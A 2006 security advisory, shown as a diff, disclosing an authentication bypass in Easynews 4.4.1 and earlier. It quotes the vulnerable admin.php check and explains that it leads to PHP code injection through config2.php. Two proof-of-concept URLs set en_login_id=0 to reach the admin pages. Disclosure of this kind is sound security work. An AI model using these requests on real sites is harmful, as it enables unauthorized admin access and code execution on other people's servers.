@@ -1,0 +1,29 @@
++-------------------------------------------------------------------------------------------
++ Easynews <= 4.4.1 (admin.php) Authentication Bypass Vulnerability
++-------------------------------------------------------------------------------------------
++ Affected Software .: Easynews <= 4.4.1
++ Vendor ............: http://www.myupb.com/
++ Download ..........: http://fileserv.myupb.com/download.php?url=easynews4.4.1.zip
++ Description .......: "A news management system for your website."
++ Class .............: Authentication Bypass
++ Risk ..............: High (Authentication Bypass)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ Easynews doesn't properly check to ensure an administrator has been logged in with correct
++ username and password information, it only checks if $admin[$en_login_id] == "true".
++ 
++ Tested and working on version 4.4.0 and 4.4.1 (previous versions may also be affected)
++ with register_globals = On, after bypassing the login check administrators have the option
++ to edit config2.php (PHP code can be inserted then executed by visiting config2.php directly
++ or any other script that includes config2.php) and other general settings.
++ 
++ Vulnerable Code:
++ admin.php, line(s) 22: if(@$admin[$en_login_id] == "true") //admin is logged in successfuly
++ 
++ Proof Of Concept:
++ http://[target]/[path]/admin.php?action=users&en_login_id=0
++ http://[target]/[path]/admin.php?action=config&en_login_id=0
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-10-17]
